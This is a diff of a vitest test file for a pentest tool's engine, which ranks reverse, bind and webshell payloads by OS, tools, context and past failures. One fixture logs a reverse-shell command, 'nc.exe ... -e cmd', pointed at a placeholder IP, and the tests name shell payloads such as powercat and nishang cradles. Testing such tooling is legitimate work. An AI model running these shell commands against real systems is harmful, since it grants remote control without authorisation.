@@ -1,10 +1,14 @@
 import { readFileSync } from "node:fs";
 import { resolve } from "node:path";
 import { describe, expect, it } from "vitest";
-import { inferContext, inferSituation, rankPayloads, type PayloadSituation } from "../../../engines/payloads/fit";
+import { PASTE_CONTEXTS, type PasteContext } from "../../../engines/payloads/context";
+import {
+  callbackClue, inferContext, inferredTools, inferSituation, rankPayloads, TOOL_LABEL, type PayloadSituation, type Toggles,
+} from "../../../engines/payloads/fit";
+import { SHELLS } from "../../../engines/payloads/shells";
 import { MSFVENOM } from "../../../engines/payloads/msfvenom";
 import { REVERSE_SHELLS } from "../../../engines/payloads/reverseShells";
-import type { PayloadDef } from "../../../engines/payloads/types";
+import type { PayloadDef, ToolId } from "../../../engines/payloads/types";
 import type { Host } from "../../../types/host";
 import type { LogEntry } from "../../../types/log";
 import type { Service } from "../../../types/service";
@@ -45,22 +49,23 @@ describe("fit engine", () => {
     expect(rankPayloads(REVERSE_SHELLS, situation, ctx).fits[0].id).toBe("ps-b64");
   });
 
-  it("a logged nc.exe payload marked failed folds nc-exe with 'Failed here before'", () => {
-    // Task 6 adds LogEntry.payloadId; inferSituation will fill failedPayloadIds then.
+  it("a payload that failed here is marked 'Failed here before' and sorts last, still a fit", () => {
     const s = { ...base, os: "windows" as const, failedPayloadIds: ["nc-exe"] };
     const r = rankPayloads(REVERSE_SHELLS, s, null);
-    expect(ids(r.fits)).not.toContain("nc-exe");
-    expect(r.misfits.find((m) => m.def.id === "nc-exe")?.reason).toBe("Failed here before");
+    expect(r.misfits.map((m) => m.def.id)).not.toContain("nc-exe");
+    expect(r.marks["nc-exe"]).toEqual(["Failed here before"]);
+    expect(ids(r.fits).at(-1)).toBe("nc-exe");
   });
 
-  it("absent python3 folds python3", () => {
+  it("absent python3 marks python3 'Needs python3'", () => {
     const { situation } = inferSituation({
       host: host({ os: "linux" }), services: [],
       entries: [cmdEntry("which python3 python", "")], examKind: false,
     });
     expect(situation.tools.absent).toEqual(expect.arrayContaining(["python3", "python"]));
     const r = rankPayloads(REVERSE_SHELLS, situation, null);
-    expect(r.misfits.find((m) => m.def.id === "python3")?.reason).toBe("Needs python3, which isn't on this box");
+    expect(r.misfits.map((m) => m.def.id)).not.toContain("python3");
+    expect(r.marks.python3).toEqual(["Needs python3"]);
   });
 
   it("os null lists both OSes as fits and context null, nothing empty", () => {
@@ -130,7 +135,8 @@ describe("fit engine", () => {
     const w = rankPayloads(REVERSE_SHELLS, { ...base, os: "windows" }, "bash-prompt");
     expect(w.misfits.find((m) => m.def.id === "nc-exe")?.reason).toBe("Doesn't work in Bash prompt");
     const nc = rankPayloads(REVERSE_SHELLS, { ...base, os: "windows", tools: { present: [], absent: ["nc.exe"] } }, null);
-    expect(nc.misfits.find((m) => m.def.id === "nc-exe")?.reason).toBe("Needs nc with -e, which isn't on this box");
+    expect(nc.misfits.map((m) => m.def.id)).not.toContain("nc-exe");
+    expect(nc.marks["nc-exe"]).toEqual(["Needs nc with -e"]);
   });
 
   it("keeps catalogue order among fits and sends non-matching contexts to misfits", () => {
@@ -231,12 +237,105 @@ describe("service preference (spec §4.2): a soft sort key, never a fold", () =>
 });
 
 describe("failure memory wiring", () => {
-  it("a logged failed nc-exe entry folds nc-exe with 'Failed here before'", () => {
+  it("a logged failed nc-exe entry marks nc-exe 'Failed here before'", () => {
     const failed: LogEntry = { ...cmdEntry("nc.exe 192.0.2.10 443 -e cmd", "Access is denied."), payloadId: "nc-exe" };
     const { situation } = inferSituation({ host: host(), services: [], entries: [failed], examKind: false });
     expect(situation.failedPayloadIds).toEqual(["nc-exe"]);
-    const { fits, misfits } = rankPayloads(REVERSE_SHELLS, situation, null);
-    expect(ids(fits)).not.toContain("nc-exe");
-    expect(misfits.find((m) => m.def.id === "nc-exe")?.reason).toBe("Failed here before");
+    const { fits, misfits, marks } = rankPayloads(REVERSE_SHELLS, situation, null);
+    expect(ids(fits)).toContain("nc-exe");
+    expect(misfits).toEqual([]);
+    expect(marks["nc-exe"]).toEqual(["Failed here before"]);
+  });
+});
+
+const RELIABLE = ["bash-tcp", "mkfifo-nc", "mkfifo-nc-bg", "python3", "php-exec", "ps-b64", "powercat-cradle", "nishang-cradle", "nc-exe"];
+const ALL_TOOLS: ToolId[] = ["bash", "python3", "perl", "nc", "nc-e", "socat", "powershell", "curl", "wget"];
+const blocked = (tools: Toggles["tools"] = {}): Toggles => ({ callbacksBlocked: true, tools });
+
+describe("marks: toggles and tools never fold", () => {
+  it("reliables never fold", () => {
+    const allMissing = Object.fromEntries(ALL_TOOLS.map((t) => [t, "missing"])) as Toggles["tools"];
+    const absent = ["php", "nc.exe", ...ALL_TOOLS];
+    for (const os of ["linux", "windows", null] as const) {
+      for (const ctx of [null, ...PASTE_CONTEXTS.map((c) => c.id)] as (PasteContext | null)[]) {
+        for (const callbacksBlocked of [true, false]) {
+          for (const missing of [true, false]) {
+            const s: PayloadSituation = {
+              ...base, os, failedPayloadIds: RELIABLE,
+              tools: missing ? { present: [], absent } : { present: [], absent: [] },
+            };
+            const r = rankPayloads(SHELLS, s, ctx, { callbacksBlocked, tools: missing ? allMissing : {} });
+            for (const id of RELIABLE) {
+              const d = SHELLS.find((x) => x.id === id)!;
+              if ((os && d.os !== os) || (ctx && !d.contexts.includes(ctx))) continue;
+              expect(ids(r.fits), `${id} ${os} ${ctx} ${callbacksBlocked} ${missing}`).toContain(id);
+            }
+          }
+        }
+      }
+    }
+  });
+
+  it("callbacks blocked puts binds first and marks reverses", () => {
+    const r = rankPayloads(SHELLS, { ...base, os: "linux" }, "bash-prompt", blocked());
+    const binds = ids(SHELLS.filter((d) => d.shape === "bind" && d.os === "linux" && d.contexts.includes("bash-prompt")));
+    expect(binds.length).toBeGreaterThan(0);
+    expect(ids(r.fits).slice(0, binds.length)).toEqual(binds);
+    expect(r.marks["bash-tcp"]).toEqual(["Needs a callback"]);
+    for (const d of SHELLS.filter((x) => x.shape)) expect(r.marks[d.id]).toBeUndefined();
+    // Uploaded webshells are not reverse: unmarked with callbacks blocked.
+    const up = rankPayloads(SHELLS, { ...base, os: "linux" }, "uploaded-file", blocked());
+    expect(up.marks["upload-php-cmd"]).toBeUndefined();
+    expect(up.marks["upload-php-pentestmonkey"]).toEqual(["Needs a callback"]);
+    expect(up.fits[0]!.shape).toBe("webshell");
+    // Unblocked: no callback marks, binds keep catalogue order.
+    const open = rankPayloads(SHELLS, { ...base, os: "linux" }, "bash-prompt");
+    expect(open.marks).toEqual({});
+    expect(open.fits[0]!.id).toBe("bash-tcp");
+  });
+
+  it("marks come in order: callback, tools, failed", () => {
+    const s = { ...base, os: "linux" as const, failedPayloadIds: ["mkfifo-nc"] };
+    const r = rankPayloads(SHELLS, s, null, blocked({ nc: "missing" }));
+    expect(r.marks["mkfifo-nc"]).toEqual(["Needs a callback", "Needs nc", "Failed here before"]);
+    expect(r.marks["bind-mkfifo-nc"]).toEqual(["Needs nc"]);
+  });
+
+  it("owner tick beats inference", () => {
+    const s = { ...base, os: "linux" as const, tools: { present: [], absent: ["python3"] } };
+    expect(rankPayloads(SHELLS, s, null, { callbacksBlocked: false, tools: { python3: "present" } }).marks.python3).toBeUndefined();
+    const r = rankPayloads(SHELLS, { ...base, os: "linux" }, null, { callbacksBlocked: false, tools: { perl: "missing" } });
+    expect(r.marks.perl).toEqual(["Needs perl"]);
+    const unmarked = ids(r.fits).filter((id) => !r.marks[id]);
+    expect(ids(r.fits).indexOf("perl")).toBeGreaterThanOrEqual(unmarked.length);
+    expect(ids(r.fits).slice(0, unmarked.length)).toEqual(unmarked);
+  });
+
+  it("php marks from inference only; awk, busybox and served-file never mark", () => {
+    const s = { ...base, os: "linux" as const, tools: { present: [], absent: ["php", "awk", "busybox"] } };
+    const r = rankPayloads(SHELLS, s, null);
+    expect(r.marks["php-exec"]).toEqual(["Needs php"]);
+    expect(r.marks.awk).toBeUndefined();
+    expect(r.marks["busybox-nc"]).toBeUndefined();
+    const w = rankPayloads(SHELLS, { ...base, os: "windows" }, null, { callbacksBlocked: false, tools: { powershell: "present" } });
+    expect(w.marks["powercat-cradle"]).toBeUndefined();
+  });
+
+  it("inferredTools maps names to tool ids; nc.exe is nc with -e", () => {
+    expect(inferredTools({ ...base, tools: { present: ["nc.exe", "python3", "gcc"], absent: ["perl", "php"] } }))
+      .toEqual({ "nc-e": "present", python3: "present", perl: "missing" });
+    expect(TOOL_LABEL["nc-e"]).toBe("nc with -e");
+    expect(TOOL_LABEL.powershell).toBe("PowerShell");
+  });
+
+  it("callbackClue", () => {
+    const s = (failed: string[]) => ({ ...base, failedPayloadIds: failed });
+    expect(callbackClue(s(["bash-tcp"]), SHELLS)).toBeNull();
+    expect(callbackClue(s(["bash-tcp", "python3"]), SHELLS)).toBe("Callbacks failed here twice");
+    expect(callbackClue(s(["bash-tcp", "python3", "nc-exe"]), SHELLS)).toBe("Callbacks failed here 3 times");
+    expect(callbackClue(s(["bash-tcp", "bind-socat"]), SHELLS)).toBeNull();
+    expect(callbackClue(s(["bash-tcp", "upload-php-cmd"]), SHELLS)).toBeNull();
+    // Only defs in the list count.
+    expect(callbackClue(s(["bash-tcp", "python3"]), SHELLS.filter((d) => d.id !== "python3"))).toBeNull();
   });
 });
